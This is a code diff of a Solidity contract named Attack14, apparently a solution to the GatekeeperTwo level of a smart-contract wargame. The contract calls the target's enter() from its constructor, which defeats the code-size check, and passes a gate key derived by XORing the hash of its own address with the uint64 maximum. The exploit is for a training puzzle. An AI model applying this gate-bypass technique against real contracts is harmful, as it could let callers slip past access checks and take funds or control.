@@ -7,11 +7,18 @@ contract Attack14 {
     address public entrant;
     GatekeeperTwo public target;
 
-    constructor(address _targetAddress, bytes8 _gateKey) {
+    constructor(address _targetAddress) {
         target = GatekeeperTwo(_targetAddress);
-        // call attack() from here - gateKey = "0000000000000000"
-        target.enter(_gateKey);
-    }
+        bool result;
 
-    // function attack() external {}
+        uint64 gateKey = uint64(
+            bytes8(keccak256(abi.encodePacked(address(this))))
+        );
+        gateKey = gateKey ^ type(uint64).max;
+
+        (bool _result, ) = address(_targetAddress).call(
+            abi.encodeWithSignature(("enter(bytes8)"), bytes8(gateKey))
+        );
+        result = _result;
+    }
 }
